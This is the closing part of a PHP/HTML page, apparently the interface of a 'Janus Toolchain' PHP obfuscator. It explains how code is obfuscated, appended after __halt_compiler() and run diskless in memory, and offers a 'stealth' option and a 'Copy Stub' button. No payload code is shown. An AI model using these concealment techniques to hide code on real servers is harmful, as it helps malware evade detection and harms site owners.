                </div>
            <?php else: ?>
                <div class="step">
                    <div class="step__num">1</div>
                    <div class="step__title">Obfuscate</div>
                    <div class="step__desc">Source code is obfuscated using bitwise NOT (<code>~</code>) or string reversal (<code>strrev</code>).</div>
                </div>
                <div class="step">
                    <div class="step__num">2</div>
                    <div class="step__title">Append</div>
                    <div class="step__desc">The raw obfuscated binary payload is appended directly after <code>__halt_compiler();</code>.</div>
                </div>
                <div class="step">
                    <div class="step__num">3</div>
                    <div class="step__title">Run Diskless</div>
                    <div class="step__desc">At execution, loader restores the payload in memory and runs it via stream wrapper or temp-file include.</div>
                </div>
            <?php endif; ?>
        </div>
    </div>

    <footer class="footer">
        Janus Toolchain &middot; Built with Premium Aesthetics &middot; PHP 5.5+ Compatible
    </footer>

</div>

<script>
(function() {
    var engineSelectLocal = document.getElementById('engineSelectLocal');
    if (engineSelectLocal) {
        var stealthFieldLocal = document.getElementById('stealthFieldLocal');
        var passwordFieldLocal = document.getElementById('passwordFieldLocal');
        function toggleStealthFieldLocal() {
            if (engineSelectLocal.value === 'aes') {
                stealthFieldLocal.style.display = 'flex';
                passwordFieldLocal.style.display = 'flex';
            } else {
                stealthFieldLocal.style.display = 'none';
                passwordFieldLocal.style.display = 'none';
            }
        }
        engineSelectLocal.addEventListener('change', toggleStealthFieldLocal);
        toggleStealthFieldLocal();
    }

    var copyBtn = document.getElementById('btnCopy');
    if (copyBtn) {
        copyBtn.addEventListener('click', function() {
            var encoded = copyBtn.getAttribute('data-code');
            var raw = atob(encoded);
            navigator.clipboard.writeText(raw).then(function() {
                copyBtn.textContent = '✓ Copied!';
                copyBtn.classList.add('copied');
                setTimeout(function() {
                    copyBtn.innerHTML = '&#128203;&nbsp; Copy Stub';
                    copyBtn.classList.remove('copied');
                }, 2000);
            });
        });
    }
})();
</script>
</body>
</html>
